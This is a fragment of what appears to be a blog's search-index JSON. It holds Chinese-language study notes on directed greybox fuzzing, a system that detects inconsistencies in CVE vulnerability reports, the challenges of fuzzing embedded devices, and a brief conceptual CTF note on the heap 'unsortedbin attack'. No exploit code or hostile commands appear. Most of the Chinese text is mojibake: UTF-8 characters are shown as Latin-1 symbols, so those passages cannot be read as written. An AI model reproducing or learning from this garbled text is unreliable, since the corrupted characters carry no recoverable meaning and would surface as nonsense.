‡åœ¨äº¤é”™ç©ºé—´ä¸­åº”å…·æœ‰å¯†åˆ‡çš„å…³ç³»ã€‚ Design Multi-dimensional Fitness Metric ç›®å‰çš„æ¨¡ç³Šæ–¹æ³•ä¸»è¦é›†ä¸­åœ¨è·¯å¾„å±‚é¢çš„è¦†ç›–ï¼Œè¿™å¿½ç•¥äº†å³ä½¿æ‰§è¡Œè„†å¼±çš„ä»£ç ï¼Œä¸€äº›bugä¹Ÿä¸ä¼šè¢«è§¦å‘æˆ–æ˜¾ç¤ºçš„äº‹å®ã€‚ä¸ºäº†æ£€æµ‹è¿™ç§â€œéš¾ä»¥æ˜¾ç¤ºâ€çš„æ¼æ´ï¼Œé€‚åº”åº¦åº¦é‡å¿…é¡»æ‰©å±•ä¸ºå¤šç»´åº¦ï¼Œä¾‹å¦‚çŠ¶æ€ç©ºé—´ã€‚ ä¾‹å¦‚ï¼Œåªæœ‰å½“ç¼“å†²åŒºè®¿é—®æŒ‡é’ˆæŒ‡å‘ç¼“å†²åŒºä¹‹å¤–æ—¶ï¼Œç¼“å†²åŒºæº¢å‡ºæ¼æ´æ‰ä¼šåœ¨ç¼“å†²åŒºè®¿é—®ä½ç½®æ˜¾ç¤ºã€‚ç±»ä¼¼åœ°ï¼Œåªæœ‰å½“è¢«é€’å¢çš„å˜é‡å…·æœ‰è¶³å¤Ÿå¤§çš„å€¼æ—¶ï¼Œæ‰ä¼šåœ¨ç¼–ç¨‹ä½ç½®è§‚å¯Ÿåˆ°æ•´æ•°æº¢å‡ºæ¼æ´ã€‚ çŠ¶æ€ç©ºé—´æ˜¯ä¸€ä¸ªå€¼å¾—ä¸æ¼æ´ä½ç½®çš„å¯è¾¾æ€§ä¸€èµ·è€ƒè™‘ä½œä¸ºé€‚åº”åº¦åº¦é‡çš„ç»´åº¦ã€‚åœ¨å®è·µä¸­ï¼Œå¤§å¤šæ•°åŸºäºæ¨¡ç³Šçš„æ–¹æ³•åªåœ¨æ‰§è¡ŒæŸäº›ä»£ç æ—¶å–å¾—è¿›å±•ï¼Œå¿½ç•¥äº†çŠ¶æ€æœºçš„æ›´æ–°ã€‚ç„¶è€Œï¼Œæœ‰äº›æ¼æ´å¯èƒ½åªæœ‰æŸäº›åˆ°è¾¾æ¼æ´ç‚¹ä¸”çŠ¶æ€æ­£ç¡®çš„æ‰§è¡Œæ‰å¯èƒ½è¡¨ç°å‡ºè„†å¼±è¡Œä¸ºã€‚ä¸ºäº†æš´éœ²è¿™ç§æ¼æ´ï¼Œæˆ‘ä»¬éœ€è¦è¾“å…¥ä¸ä»…èƒ½åˆ°è¾¾æ¼æ´ä½ç½®ï¼Œè€Œä¸”è¿˜èƒ½åŒ¹é…è„†å¼±çŠ¶æ€[81]ã€‚ Multi-objective Optimization å¤šç›®æ ‡ä¼˜åŒ–æ¯”åªèƒ½å®ç°ä¸€ä¸ªç›®æ ‡çš„ä¼ ç»Ÿç­–ç•¥æ›´æœ‰ä¼˜åŠ¿ã€‚å®ƒåˆ¶å®šäº†å¤šä¸ªå±æ€§ä¹‹é—´çš„æƒè¡¡ï¼Œå¦‚å¯ç”¨æ€§å’Œå®‰å…¨æ€§[100]ã€‚ä¾‹å¦‚ï¼Œå¤šç›®æ ‡ä¼˜åŒ–å¯ä»¥ç”Ÿæˆè¦†ç›–ç‰¹å®šç›®æ ‡çš„æµ‹è¯•é›†ï¼ŒåŒæ—¶æœ€å¤§é™åº¦åœ°æé«˜æ€»ä½“è¦†ç›–ç‡ï¼Œæˆ–è€…ä¼˜å…ˆè€ƒè™‘è¦†ç›–å°½å¯èƒ½å¤šçš„è½¯ä»¶çš„æµ‹è¯•ï¼ŒåŒæ—¶æœ€å¤§é™åº¦åœ°å‡å°‘æµ‹è¯•è¿è¡Œ[45]æ‰€éœ€çš„æ—¶é—´ã€‚å¤šç›®æ ‡æœç´¢çš„ç»“æœæ˜¯ä¸€ç»„å¸•ç´¯æ‰˜æœ€ä¼˜è§£ï¼Œå…¶ä¸­å¯¹äºæ‰€æœ‰ç›®æ ‡[45]ï¼Œé›†åˆä¸­çš„æ¯ä¸ªæˆå‘˜éƒ½ä¸æ¯”å…¶ä»–ä»»ä½•æˆå‘˜æ›´å¥½ã€‚ ä¼˜åŒ–å¤šä¸ªç›®æ ‡çš„ä¸€èˆ¬è§£å†³æ–¹æ¡ˆæ˜¯ååŒè¿›åŒ–ï¼Œå…¶ä¸­ä¸¤ä¸ª(æˆ–å¤šä¸ª)æµ‹è¯•è¾“å…¥ç¾¤ä½“ä½¿ç”¨å®ƒä»¬è‡ªå·±çš„é€‚åº”åº¦å‡½æ•°ä»¥åˆä½œçš„æ–¹å¼åŒæ—¶è¿›åŒ–[101]ã€‚ Target for New Domains å†…æ ¸æµ‹è¯• åœ¨è¯„ä¼°çš„å·¥å…·ä¸­ï¼Œåªæœ‰ä¸€ä¸ª(SemFuzz[19])æ”¯æŒå†…æ ¸ä»£ç æµ‹è¯•ã€‚å› æ­¤ï¼Œåœ¨å†…æ ¸ä»£ç ä¸­å¼•å…¥DGFï¼Œå¹¶åœ¨å…³é”®ä½ç½®(å¦‚ç³»ç»Ÿè°ƒç”¨å’Œé”™è¯¯å¤„ç†ä»£ç )å¼•å¯¼æ¨¡ç³Šå¤„ç†æ¥å‘ç°å†…æ ¸é”™è¯¯åº”è¯¥æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ–¹å‘ã€‚ åè®®æµ‹è¯• å®šå‘æµ‹è¯•å¯ä»¥åŠ å¼ºåè®®æ¶ˆæ¯çš„å…³é”®å­—æ®µï¼Œä¾‹å¦‚æ¶ˆæ¯é•¿åº¦å’Œæ§åˆ¶ä¿¡æ¯ã€‚Zhuetç­‰[103]åˆ©ç”¨dgfé€šè¿‡ç›®æ ‡å’Œæ‰§è¡Œé—´æ¥è·³è½¬æ¥æ„å»ºæ›´å®Œæ•´çš„æ§åˆ¶æµå›¾ã€‚ å°†DGFåº”ç”¨äºå…·æœ‰ç‰¹å®šç‰¹å¾çš„bugç±»å‹ æ„Ÿå…´è¶£çš„ æœºå™¨å­¦ä¹ fuzz â€œ such as by machine learning [27â€“29]â€ hawkeye[67] åˆ©ç”¨åŸºäºæ·±åº¦å­¦ä¹ çš„æ¨¡å‹ï¼Œå¯ä»¥é¢„æµ‹å‡½æ•°çš„è„†å¼±æ¦‚ç‡ï¼Œå¹¶ä¸ºè„†å¼±å‡½æ•°ä¸­çš„æ¯ä¸ªåŸºæœ¬å—ç»™å‡ºä¸€ä¸ªé™æ€è„†å¼±è¯„åˆ†æ¥è¡¡é‡å‡½æ•°çš„è„†å¼±æ¦‚ç‡ã€‚ç„¶åï¼Œå¯¹äºæ¯ä¸ªè¾“å…¥ï¼Œæ‰§è¡Œè·¯å¾„ä¸Šæ‰€æœ‰åŸºæœ¬å—çš„é™æ€è„†å¼±å¾—åˆ†ä¹‹å’Œè¢«ç”¨ä½œé€‚åº”åº¦å¾—åˆ†ï¼Œä»¥ä¼˜å…ˆè€ƒè™‘å¾—åˆ†è¾ƒé«˜çš„è¾“å…¥[27,28]ã€‚ metricé‚£é‡Œçš„è®ºæ–‡å…¶å®éƒ½å¯ä»¥çœ‹çœ‹ FuzzGuard [89]utilizes a deep-learning-based approach to predict and filterout unreachable inputs before exercising them BEACON[90]ä½¿ç”¨è½»é‡çº§é™æ€åˆ†æå‰”é™¤ä¸å¯è¡Œçš„è·¯å¾„(å³åœ¨è¿è¡Œæ—¶æ— æ³•åˆ°è¾¾ç›®æ ‡ä»£ç çš„è·¯å¾„)ï¼Œå¯ä»¥æ‹’ç»åœ¨æ¨¡ç³Šå¤„ç†æœŸé—´æ‰§è¡Œçš„80%ä»¥ä¸Šçš„è·¯å¾„ å¯¹äºåˆ†æ”¯æ¦‚ç‡è¿™æ–¹é¢å¥½åƒæ²¡ä»€ä¹ˆè®ºæ–‡ dgfçš„å¦ä¸€ä¸ªæœ‰è¶£çš„åº”ç”¨æ˜¯åœ¨æµ‹è¯•èµ„æºæœ‰é™çš„æƒ…å†µä¸‹ã€‚ä¾‹å¦‚ï¼Œå½“æ¨¡ç³Šç‰©è”ç½‘è®¾å¤‡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯†åˆ«å…³é”®ä»£ç åŒºåŸŸæ¥æŒ‡å¯¼æµ‹è¯•æ¯”ä»¥æ— å¯¼å‘çš„æ–¹å¼æµ‹è¯•æ•´ä¸ªç¨‹åºæ›´æœ‰æ•ˆï¼Œè¿™å¯ä»¥èŠ‚çœæ—¶é—´å’Œè®¡ç®—èµ„æºèŠ±åœ¨æ²¡æœ‰bugçš„ä»£ç åŒºåŸŸä¸Šã€‚GREYHOUND[12]å’ŒRVFUZZER[33]åˆ†åˆ«ä¸ºWi-Fiå®¢æˆ·ç«¯å’Œæœºå™¨äººè½¦è¾†è®¾è®¡ï¼Œå‡é€‚ç”¨äºæ­¤åœºæ™¯ã€‚ ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/the-progress-challenges-and-perspectives-of-directed-greybox-fuzzing/","summary":"å®šå‘ç°ç›’æ¨¡ç³ŠæŠ€æœ¯çš„è¿›å±•ã€æŒ‘æˆ˜ä¸å±•æœ› ä½œè€…ï¼šç‹é¹é£ å•ä½ï¼šå›½é˜²ç§‘æŠ€å¤§å­¦ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2021å¹´ æ¥æºï¼š #arxiv å…³é”®å­—ï¼š #å®šå‘fuzzing #ç»¼è¿° æ€»ç»“","title":"The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing"},{"content":"å…·ä½“å†…å®¹å¯çœ‹ [[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing]]\næœ¯è¯­ç¼©å†™ ï¼š PUT program under test DSE directed symbolic execution å®šå‘ç¬¦å·æ‰§è¡Œ DGF ç°åœ¨çš„ä¸€äº›ç ”ç©¶æ–¹å‘ï¼ˆå†…å®¹ï¼‰ï¼š è®¾è®¡æ–°çš„ fitness è·ç¦» ç›¸ä¼¼åº¦ï¼ˆæ¯”è·ç¦»æœ‰ä¼˜åŠ¿ï¼‰![[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing#^dfb282]] è„†å¼±æ€§é¢„æµ‹æ¨¡å‹ï¼ˆè„†å¼±æ¦‚ç‡ï¼‰ï¼ˆç›®å‰ç²¾åº¦ä¸é«˜ï¼‰ å®ç°å¤šç»´åº¦çš„ fitness åè°ƒï¼ˆæ„Ÿè§‰è¿™ä¸ªæ˜¯æ¯”è¾ƒå¥½åšçš„æ–¹å‘ï¼Œå †æ–™å°±è¡Œï¼‰ ä½¿ç”¨å¯å‘å¼ç®—æ³•æ¥å¤„ç†èƒ½é‡åˆ†é…ï¼ˆæœ¬è´¨ä¸Šæ˜¯åœ¨åšä¼˜åŒ–ï¼ŒAFLgo é‡Œé¢çš„æ¨¡æ‹Ÿé€€ç«ï¼‰ Targets é¢„æµ‹ å¯ä»¥ä»ä»£ç ä½ç½®å’Œç¨‹åºè¡Œä¸ºä¸¤æ–¹é¢å…¥æ‰‹ ç”Ÿæˆåˆæ³•è¾“å…¥ã€æˆ–è€…è¿‡æ»¤æ— æ•ˆè¾“å…¥ åŠ¨æ€æ±¡ç‚¹åˆ†æ è¯­ä¹‰ä¿¡æ¯ æ·±åº¦å­¦ä¹  é™æ€åˆ†æ å˜å¼‚ç­–ç•¥ ç¬¦å·æ‰§è¡Œè§£å†³å¤æ‚çº¦æŸ æ£€æµ‹ bug ç±»å‹ å‰å››é¡¹åº”è¯¥æ˜¯å±äº DGF çš„ç‰¹å®šä»»åŠ¡ï¼Œ1-2 å¸Œæœ›å¾—åˆ°æ›´æœ‰æ•ˆçš„ fitnessï¼Œ3 å¸Œæœ›èƒ½ä¼˜åŒ– fitness çš„è®¡ç®—ç®—æ³•ï¼Œç¬¬å››é¡¹å…¶å®å’Œ fitness å¯†åˆ‡ç›¸å…³ï¼Œå¾€å¾€ fitness å°±æ˜¯ targets ç¡®å®šæ–¹æ³•çš„ä¸€ä¸ªé‡åŒ–ã€‚ è€Œåå‡ é¡¹æ„Ÿè§‰ç®—æ˜¯ fuzzing ç ”ç©¶é€šç”¨çš„é—®é¢˜ï¼Œä¸»è¦æ˜¯ç”¨æ¥ä¼˜åŒ– fuzzingï¼Œæé«˜ fuzzing çš„æ•ˆç‡ æŒ‘æˆ˜ Fuzzing æ€§èƒ½ä¸‹é™ï¼Œå› ä¸º DGF æœ‰ä¸€äº›é¢å¤–çš„å¤„ç† é¢„å¤„ç† å¹¶è¡Œè®¡ç®— æå‰è¿‡æ»¤æ— æ•ˆè¾“å…¥ è½»é‡çº§ç®—æ³• æ›´åŠ ç»†ç²’åº¦çš„è°ƒæ§ ç­‰åŠ æƒæŒ‡æ ‡åå·®ç§å­ä¼˜å…ˆçº§ [[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing#Equal-weighted Metrics Bias Seed Prioritization ç­‰åŠ æƒæŒ‡æ ‡åå·®ç§å­ä¼˜å…ˆçº§]] åŸºäºè·ç¦»çš„åº¦é‡çš„å…¨å±€æœ€ä¼˜å·®å¼‚ å‹˜æ¢é˜¶æ®µå’Œå¼€å‘é˜¶æ®µçš„ä¸çµæ´»åè°ƒï¼ˆEcoFuzz è§£å†³äº†è¯¥é—®é¢˜ï¼‰ è¿‡äºä¾èµ–æºä»£ç ï¼ˆæˆ–è€…è¯´äºŒè¿›åˆ¶å±‚æ¬¡ä¸Šçš„æµ‹è¯•éš¾ä»¥å¼€å±•ï¼‰ ç¡¬ä»¶è¾…åŠ©æ¨¡æ‹Ÿ æœºå™¨å­¦ä¹ å’Œå¯å‘å¼äºŒè¿›åˆ¶å·®åˆ†æ³•æ¥è¯†åˆ« targets åº”ç”¨ patch testing bug reproduction knowledge integration result validation energy saving dgf çš„å¦ä¸€ä¸ªæœ‰è¶£çš„åº”ç”¨æ˜¯åœ¨æµ‹è¯•èµ„æºæœ‰é™çš„æƒ…å†µä¸‹ã€‚ä¾‹å¦‚ï¼Œå½“æ¨¡ç³Šç‰©è”ç½‘è®¾å¤‡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯†åˆ«å…³é”®ä»£ç åŒºåŸŸæ¥æŒ‡å¯¼æµ‹è¯•æ¯”ä»¥æ— å¯¼å‘çš„æ–¹å¼æµ‹è¯•æ•´ä¸ªç¨‹åºæ›´æœ‰æ•ˆï¼Œè¿™å¯ä»¥èŠ‚çœæ—¶é—´å’Œè®¡ç®—èµ„æºèŠ±åœ¨æ²¡æœ‰ bug çš„ä»£ç åŒºåŸŸä¸Šã€‚GREYHOUND[12]å’Œ RVFUZZER[33]åˆ†åˆ«ä¸º Wi-Fi å®¢æˆ·ç«¯å’Œæœºå™¨äººè½¦è¾†è®¾è®¡ï¼Œå‡é€‚ç”¨äºæ­¤åœºæ™¯ã€‚ Special bug detection. è¿™éƒ¨åˆ†å¯ç¤ºæ€§ä¸å¤§\næœªæ¥è¶‹åŠ¿ å¤š targets åè°ƒ å¤šç»´åº¦ fitness å¤šç›®æ ‡ä¼˜åŒ– DGF åº”ç”¨åˆ°å…¶ä»–é¢†åŸŸï¼ˆå†…æ ¸ã€åè®®ç­‰ç­‰ï¼‰ ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/3.%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/the-progress-challenges-and-perspectives-of-directed-greybox-fuzzing-%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/","summary":"å…·ä½“å†…å®¹å¯çœ‹ [[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing]] æœ¯è¯­ç¼©å†™ ï¼š PUT program under test DSE directed symbolic execution å®šå‘ç¬¦å·æ‰§è¡Œ DGF ç°åœ¨çš„ä¸€äº›ç ”ç©¶æ–¹å‘ï¼ˆå†…å®¹ï¼‰ï¼š è®¾è®¡æ–°çš„ fitness è·ç¦» ç›¸ä¼¼åº¦ï¼ˆæ¯”è·ç¦»æœ‰ä¼˜åŠ¿ï¼‰![[","title":"The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing æ€»ç»“ç¬”è®°"},{"content":"ä¸­æ–‡è¯‘åï¼šæµ…è°ˆå…¬å…±å®‰å…¨æ¼æ´æŠ¥å‘Šä¸ä¸€è‡´çš„æ£€æµ‹ ä½œè€…ï¼šYing Dong å•ä½ï¼š å›½ç§‘å¤§ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2019å¹´ æ¥æºï¼š #USENIXä¼šè®® å…³é”®å­—ï¼š #æå–ä¿¡æ¯ ä»£ç åœ°å€ï¼špinkymm/inconsistency_detection: Towards the Detection of Inconsistencies in Public Security Vulnerability Reports (github.com) ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-05-15 14:53\nAbstract we propose an automated system VIEM to detect inconsistent information between the fully standardized NVD database and the unstructured CVE descriptions and their referenced vulnerability reports. VIEM is developed to extract vulnerable software names and vulnerable versions from unstructured text. We introduce customized designs to deep-learning-based named entity recognition (NER) and relation extraction (RE) so that VIEM can recognize previous unseen software names and versions based on sentence structure and contexts. Design Named Entity Recognition Model use a state-of-the-art NER model to identify the entities of interest, i.e., the name and version of the vulnerable software those of vulnerable components and those of underlying software systems that vulnerable software depends upon.\nuse a standard word embedding approach to encode tach word as a vector representation use Bi-GRU to perform text encoding at the character level. use other Bi-GRU to assign label to every word : SN for software name, SV for software version, O for other build a dictionary consisting of 81,551 software to rectify the result of NER model. Relation Extraction Model utilizes a Relation Extraction (RE) model to pair identified entities accordingly\nstep 1: encodes the occurence of the SN and SV, and then yields a group of position embeddings representing the relative distances from current word to the two named entities in the same sentence. step 2: use the same way as the NER to generate the embedding, then right behind the word embedding, the RE model appends each group of the position embeddings individually. step 3: each pair of word embedding and position encoding through a attention netword and then use other attention netword to predicts which pair is true. Transfer Learning learns the aforementioned NER and RE models using vulnerability reports in one primary category and then transfers their capability into other vulnerability categories\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/towards-the-detection-of-inconsistencies-in-public-security-vulnerability-reports/","summary":"ä¸­æ–‡è¯‘åï¼šæµ…è°ˆå…¬å…±å®‰å…¨æ¼æ´æŠ¥å‘Šä¸ä¸€è‡´çš„æ£€æµ‹ ä½œè€…ï¼šYing Dong å•ä½ï¼š å›½ç§‘å¤§ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2019å¹´ æ¥æºï¼š #USENIXä¼šè®® å…³é”®å­—ï¼š #æå–ä¿¡","title":"Towards the Detection of Inconsistencies in Public Security Vulnerability Reports"},{"content":"(72æ¡æ¶ˆæ¯) å †æ¼æ´æŒ–æ˜â€”â€”unsortedbin attackæ¼æ´_unsorted bin attack_è‘£å“¥çš„é»‘æ¿æŠ¥çš„åšå®¢-CSDNåšå®¢ ubsortedbin attackæ˜¯ç”¨æ¥é…åˆ [[fastbin attack]] çš„ã€‚ ubsortedbin attackæ˜¯åŒå‘é“¾è¡¨ï¼Œæ‰€ä»¥ç³»ç»Ÿä¼šå°†æˆ‘ä»¬ä¼ªé€ çš„fake chunkçš„fdå’Œbkéƒ½æŒ‡å›unsortedbiné“¾ï¼Œè€Œè¿™ä¸ªåœ°å€è‚¯å®šæ˜¯0x7få¼€å¤´çš„å¤§æ•°å€¼ï¼Œæ‰€ä»¥å°±åœ¨ç›®æ ‡åœ°å€å¤„å†™å…¥äº†0x7fã€‚\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/unsortedbin-attack/","summary":"(72æ¡æ¶ˆæ¯) å †æ¼æ´æŒ–æ˜â€”â€”unsortedbin attackæ¼æ´_unsorted bin attack_è‘£å“¥çš„é»‘æ¿æŠ¥çš„åšå®¢-CSDNåšå®¢ ubsortedbin att","title":"unsortedbin attack"},{"content":"ä½ ç ´åçš„ä¸æ˜¯ä½ ç ´åçš„: Fuzzing åµŒå…¥å¼è®¾å¤‡çš„æŒ‘æˆ˜ ä½œè€…ï¼šMarius Muench å•ä½ï¼šå·´é»é«˜ç­‰ç”µä¿¡å­¦é™¢ å›½å®¶ï¼š #æ³•å›½ å¹´ä»½ï¼š #2018å¹´ æ¥æºï¼š #NDSSä¼šè®® å…³é”®å­—ï¼š #åµŒå…¥å¼ #ç»¼è¿° [[What You Corrupt Is Not What You Crash_ Challenges in Fuzzing Embedded Devices.pdf]]\nAbstract ä¼ ç»Ÿçš„æµ‹è¯•æ–¹æ³•ä¾èµ–äºç¨‹åºä¸­çœ‹çš„è§çš„å´©æºƒ, è€ŒäºŒè¿›åˆ¶æ’è£…æŠ€æœ¯æ˜¯ç”¨æ¥æ”¹å–„é’ˆå¯¹è¿™äº›ç¼ºé™·çŠ¶æ€çš„æ£€æµ‹æ–¹æ³• æ¼”ç¤ºäº† memory corruption æ¼æ´ï¼Œå±•ç¤º embedded devices å’Œ desktop systems çš„ä¸åŒ åˆ†æäº†å‡ ç§ embedded devices è®¾å¤‡çš„å·®å¼‚ Introduction Memory corruption å¯¼è‡´çš„æ¼æ´æ™®éå­˜åœ¨ï¼Œæ¨¡ç³Šæµ‹è¯•æ˜¯å‘ç°è¿™äº›æ¼æ´æœ€æµè¡Œçš„æŠ€æœ¯ä¹‹ä¸€ï¼Œé€‚åˆå¤§è§„æ¨¡è‡ªåŠ¨åŒ– å› ä¸º embedded devices çš„æœ‰é™çš„ I/O å’Œè®¡ç®—èƒ½åŠ›ï¼Œå—é™çš„æˆæœ¬ï¼Œå…¶ä¸Šæ²¡æœ‰å¤§éƒ¨åˆ† desktop systems æ‹¥æœ‰çš„é˜²å¾¡æœºåˆ¶ï¼Œæ‰€ä»¥å‘ç”Ÿå†…å­˜æŸåçš„æ¦‚ç‡æ›´é«˜ ä½†æ˜¯ embedded devices å­˜åœ¨ç¼ºå°‘æºç ï¼Œè¯†åˆ« memory corruption çš„ä¼ ç»Ÿæ–¹æ³•ä¸é€‚ç”¨äºçš„é—®é¢˜ã€‚ æœ¬æ–‡é¦–æ¬¡å…¨é¢åˆ†æäº†å†…å­˜æŸåå¯¹ä¸åŒç±»åˆ«çš„åµŒå…¥å¼ç³»ç»Ÿçš„å½±å“ï¼Œå¹¶ä¸”æå‡ºçš„æŠ€æœ¯å¯ä»¥ 100%æ£€æµ‹åˆ°åœ¨æ¨¡ç³Šè¿‡ç¨‹ä¸­è§¦å‘çš„å†…å­˜æŸåçŠ¶æ€ FUZZING EMBEDDED SYSTEMS é¦–å…ˆä»‹ç»å°†åœ¨æœ¬æ–‡å…¶ä½™éƒ¨åˆ†ä½¿ç”¨çš„åµŒå…¥å¼ç³»ç»Ÿçš„åˆ†ç±»ã€‚ç„¶åï¼Œæˆ‘ä»¬è®¨è®ºäº†ä¹‹å‰å°†æ¨¡ç³Šæµ‹è¯•åº”ç”¨äºä¸åŒåµŒå…¥å¼è®¾å¤‡çš„å®éªŒï¼Œæœ€åæˆ‘ä»¬æå‡ºäº†åœ¨è¯¥é¢†åŸŸåº”ç”¨æ¨¡ç³Šæµ‹è¯•æ‰€é‡åˆ°çš„æŒ‘æˆ˜ã€‚\nClasses of Embedded Devices å°†åµŒå…¥å¼è®¾å¤‡åˆ†ä¸ºä»¥ä¸‹ä¸‰ç±»\nåŸºäº OS çš„é€šç”¨è®¾å¤‡ï¼šæ­¤ç±»è®¾å¤‡æ­è½½äº†è¢«æ”¹è£…ä¸ºåµŒå…¥å¼è®¾å¤‡æ“ä½œç³»ç»Ÿçš„æ¡Œé¢çº§ç³»ç»Ÿã€‚ï¼ˆä¾‹å¦‚ï¼ŒLinux æ“ä½œç³»ç»Ÿå†…æ ¸å¹¿æ³›ç”¨äºåµŒå…¥å¼é¢†åŸŸï¼Œé€šå¸¸ä¸è½»é‡çº§ç”¨æˆ·ç©ºé—´ç¯å¢ƒï¼ˆä¾‹å¦‚ busybox å’Œ uClibcï¼‰ç»“åˆä½¿ç”¨ã€‚ï¼‰ åŸºäºåµŒå…¥å¼æ“ä½œç³»ç»Ÿçš„è®¾å¤‡ï¼šæ­¤ç±»è®¾å¤‡æ­è½½äº†ä¸ºåµŒå…¥å¼è®¾å¤‡å®šåˆ¶çš„æ“ä½œç³»ç»Ÿï¼Œå†…æ ¸å’Œåº”ç”¨ç¨‹åºä»£ç ä¹‹é—´çš„é€»è¾‘åˆ†ç¦»ä»ç„¶å­˜åœ¨ã€‚ï¼ˆä¾‹å¦‚ uClinuxã€ZephyrOS å’Œ VxWorksï¼‰ æ²¡æœ‰æ“ä½œç³»ç»ŸæŠ½è±¡çš„è®¾å¤‡ï¼šæ­¤ç±»è®¾å¤‡é‡‡ç”¨æ‰€è°“çš„â€œå•ç‰‡å›ºä»¶â€ï¼Œå…¶æ“ä½œé€šå¸¸åŸºäºå•ä¸ªæ§åˆ¶ç¯è·¯å’Œä»å¤–å›´è®¾å¤‡è§¦å‘çš„ä¸­æ–­ï¼Œä»¥å¤„ç†æ¥è‡ªå¤–éƒ¨ä¸–ç•Œçš„äº‹ä»¶ã€‚å›ºä»¶å°†åŒ…å«ç¼–è¯‘çš„ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºä»£ç åœ¨ä¸€èµ·ï¼Œå½¢æˆäº†ä¸€ä¸ªå•ä¸€çš„è½¯ä»¶ã€‚ï¼ˆå•ä½“æ–¹æ³•å¯ä»¥åœ¨å„ç§ç¡¬ä»¶ç»„ä»¶æ§åˆ¶å™¨ä¸­æ‰¾åˆ°ï¼Œä¾‹å¦‚ CD è¯»å–å™¨ã€WiFi å¡æˆ– GPS åŠ å¯†ç‹—ã€‚åœ¨è¿™äº›è®¾å¤‡ä¸Šè¿è¡Œçš„ä»£ç å¯ä»¥æ˜¯å®Œå…¨è‡ªå®šä¹‰çš„ï¼Œä¹Ÿå¯ä»¥åŸºäºæ“ä½œç³»ç»Ÿåº“ï¼Œå¦‚ Contikiã€TinyOS æˆ– mbed OS 22ã€‚ï¼‰ Past Experiments ä¸‹è¡¨å±•ç¤ºäº†è¿‘å‡ å¹´æ¥é’ˆå¯¹åµŒå…¥å¼è®¾å¤‡ fuzzing çš„è®ºæ–‡ ^eea5b5\nMain Challenges of Fuzzing Embedded Devices Fault detection ä½œè€…è®¤ä¸ºæ¨¡ç³Šæµ‹è¯•å¯ä»¥é€šè¿‡æ£€æµ‹ç¨‹åºæ˜¯å¦å´©æºƒæ¥åˆ¤æ–­è¾“å…¥æ˜¯å¦è§¦å‘æ¼æ´ï¼Œè€Œæ¡Œé¢ç³»ç»Ÿå­˜åœ¨å„ç§é˜²å¾¡æœºåˆ¶æ¥æ£€æµ‹æ¶æ„è¾“å…¥ä»è€Œäº§ç”Ÿå´©æºƒï¼Œä½†æ˜¯åµŒå…¥å¼è®¾å¤‡çš„æ“ä½œç³»ç»Ÿæ²¡æœ‰å„ç§å„æ ·çš„é˜²å¾¡æœºåˆ¶ï¼Œæ‰€ä»¥å¾ˆæœ‰å¯èƒ½è§¦å‘æ¼æ´ä½†æ˜¯æ²¡æœ‰äº§ç”Ÿå´©æºƒï¼Œè¿™ç§æƒ…å†µ fuzzing å™¨æ£€æµ‹ä¸åˆ°ã€‚ å¯¹äºåµŒå…¥å¼è®¾å¤‡å¯ä»¥æ£€æµ‹åˆ°çš„å´©æºƒï¼Œå¯èƒ½å› ä¸ºç¼ºå°‘è¾“å‡ºé”™è¯¯ä¿¡æ¯çš„ I/O åŠŸèƒ½ï¼Œè€Œå¯¼è‡´ fuzzing å™¨ç›‘æµ‹ä¸åˆ° ä½œè€…ç»™å‡ºçš„è§£å†³æ–¹æ¡ˆæ˜¯éƒ¨ç½²å¤æ‚çš„æ´»æ€§æ¢æµ‹ ä¸»åŠ¨æ¢æµ‹ï¼šå°†ç‰¹æ®Šè¯·æ±‚æ’å…¥åˆ°ä¸è®¾å¤‡æˆ–å…¶ç¯å¢ƒçš„é€šä¿¡ä¸­ è¢«åŠ¨æ¢æµ‹ï¼šæ—¨åœ¨æ£€ç´¢æœ‰å…³è®¾å¤‡çŠ¶æ€çš„ä¿¡æ¯è€Œä¸æ”¹å˜å®ƒã€‚ Performance and Scalability åµŒå…¥å¼è®¾å¤‡çš„ fuzzing éš¾ä»¥å¹¶è¡ŒåŒ– æ¯è½® fuzzing ï¼ˆä¸ºäº†æ¸…ç©ºçŠ¶æ€ï¼‰é‡å¯è®¾å¤‡æ‹–æ…¢æµ‹è¯•è¿‡ç¨‹ Instrumentation åµŒå…¥å¼è®¾å¤‡å¾ˆéš¾è¿›è¡Œç¼–è¯‘æ—¶æ£€æµ‹å’Œè¿è¡Œæ—¶æ£€æµ‹æ¥æ”¶é›†è¦†ç›–ä¿¡æ¯ï¼Œæˆ–è€…é€šè¿‡åˆ«çš„ä¸€äº›ä»€ä¹ˆæŠ€æœ¯æ¥æ”¶é›†æœ‰å…³è¢«æµ‹ç³»ç»ŸçŠ¶æ€çš„ä¿¡æ¯ã€‚å› ä¸ºå¯¹äºåµŒå…¥å¼è®¾å¤‡è€Œè¨€ï¼Œæµ‹è¯•å¯¹è±¡å¾€å¾€æ˜¯å›ºä»¶æ˜ åƒï¼Œç°æœ‰çš„å·¥å…·ä¸é€‚ç”¨ï¼Œä¸éœ€è¦è®¿é—®åº”ç”¨ç¨‹åºæºä»£ç 